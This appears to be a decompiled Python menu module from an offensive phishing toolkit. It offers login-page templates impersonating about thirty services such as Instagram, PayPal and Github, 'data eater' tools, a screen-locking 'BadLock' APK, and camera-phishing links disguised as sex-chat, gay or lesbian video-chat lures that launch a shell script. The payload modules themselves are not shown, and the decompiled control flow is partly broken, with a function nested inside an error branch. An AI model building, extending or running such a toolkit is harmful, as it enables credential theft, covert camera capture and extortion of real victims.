# Source Generated with Decompyle++
# File: lang.pyc (Python 3.8)

from files.startup import *
from files.template import *
from files.deater import *
import os
def lang():
    menu_text = (
        '\x1b[1;37mLanguage' + red +
        '\n1-EN' + green +
        '\n2-DE\n'
    )
    slow(menu_text, 0.025)
    choice = input(blue + 'Choose>')
    if choice == '1':
        slow('....Ok Man....', 0.01)
        os.system('clear')
        options = (
            '\x1b[1;93m[1]\x1b[1;91m Phishing Websites (Templates)\n'
            '\x1b[1;93m[2]\x1b[1;91m Data Eaters\n'
            '\x1b[1;93m[3]\x1b[1;91m BadLock (apk)\n'
            '\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n'
            '\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n'
            '\x1b[1;93m[6]\x1b[1;91m Other\n'
            '\x1b[1;93m[7]\x1b[1;91m Custom \n'
            '\x1b[1;93m[0]\x1b\x1b[1;91m Exit\n'
        )
        slogo()
        slow(options, 0.01)
    elif choice == '2':
        slow('Moin Moin Moin', 0.01)
        os.system('clear')
        options = (
            '\x1b[1;93m[1]\x1b[1;91m Phishing-Betrug (Templates)\n'
            '\x1b[1;93m[2]\x1b[1;91m Datenfresser\n'
            '\x1b[1;93m[3]\x1b[1;91m Bildshcirmschloss (apk)\n'
            '\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n'
            '\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n'
            '\x1b[1;93m[6]\x1b[1;91m Andere\n'
            '\x1b[1;93m[7]\x1b[1;91m Benutzerdefiniert \n'
            '\x1b[1;93m[0]\x1b\x1b[1;91m Verlassen\n'
        )
        slogo()
        slow(options, 0.01)
    else:
        print('Wrong input!')
        lang()


def sites():
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m01\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Instagram\x1b[0m      \x1b[1;92m[\x1b[0m\x1b[1;77m17\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m IGFollowers\x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m02\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Facebook\x1b[0m       \x1b[1;92m[\x1b[0m\x1b[1;77m18\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Pinterest   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m03\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Snapchat\x1b[0m       \x1b[1;92m[\x1b[0m\x1b[1;77m19\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m CryptoCurrency   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m04\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Twitter\x1b[0m        \x1b[1;92m[\x1b[0m\x1b[1;77m20\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Verizon   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m05\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Github\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m21\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m DropBox   \x1b[0m ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m06\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Google\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m22\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Adobe ID   \x1b[0m ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m07\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Spotify\x1b[0m        \x1b[1;92m[\x1b[0m\x1b[1;77m23\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Shopify   \x1b[0m  ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m08\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Netflix\x1b[0m        \x1b[1;92m[\x1b[0m\x1b[1;77m24\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Messenger   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m09\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m PayPal\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m25\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m GitLab   \x1b[0m    ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m10\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Origin\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m26\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Twitch   \x1b[0m     ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m11\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Steam\x1b[0m          \x1b[1;92m[\x1b[0m\x1b[1;77m27\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m MySpace   \x1b[0m    ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m12\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Yahoo\x1b[0m          \x1b[1;92m[\x1b[0m\x1b[1;77m28\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Badoo   \x1b[0m      ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m13\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Linkedin\x1b[0m       \x1b[1;92m[\x1b[0m\x1b[1;77m29\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m VK   \x1b[0m         ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m15\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Wordpress\x1b[0m      \x1b[1;92m[\x1b[0m\x1b[1;77m30\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Yandex   \x1b[0m     ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m14\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Protonmail\x1b[0m     \x1b[1;92m[\x1b[0m\x1b[1;77m31\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m devianART   \x1b[0m ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m16\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Microsoft\x1b[0m      ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m00\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Back\x1b[0m ')
    csite()

def main_menu():
        option = input(f"{red}Option {yellow}>{green} ")
        if option == '1':
            sites()
        elif option == '2':
            os.system('clear')
            slogo()
            deater()
        elif option == '3':
            os.system('clear')
            slogo()
            block()
        elif option == '4':
            os.system('clear')
            slogo()
            camphish()
        elif option == '5':
            soon()
        elif option == '6':
            soon()
        elif option == '7':
            soon()
        elif option == '8':
            soon()
        elif option == '0':
            lang()
        else:
            print('wrong input!')
            main_menu()
            def camphish():
                menu_prefix = red + '[' + green + '0' + red + ']'
                menu_options = [
                    'SexChat',
                    'Learn English',
                    'Gay Video Chat',
                    'Lesbian Video Chat',
                    'Make me Old',
                    'X-Ray',
                    'Online make-up',
                    'exit'
                ]
                for idx, option in enumerate(menu_options, start=1):
                    slow(f'\n\r{menu_prefix.replace("0", str(idx))}{yellow} {option}', 0.005)

                print('\n')
                choice = input(green + 'Choice ' + red + '>' + yellow)
                if choice == '1':
                    os.system('cd cp/1/;bash script.sh')
                elif choice in ['2', '3', '4', '5', '6', '7']:
                    soon()
                else:
                    os.system('clear')
                    camphish()

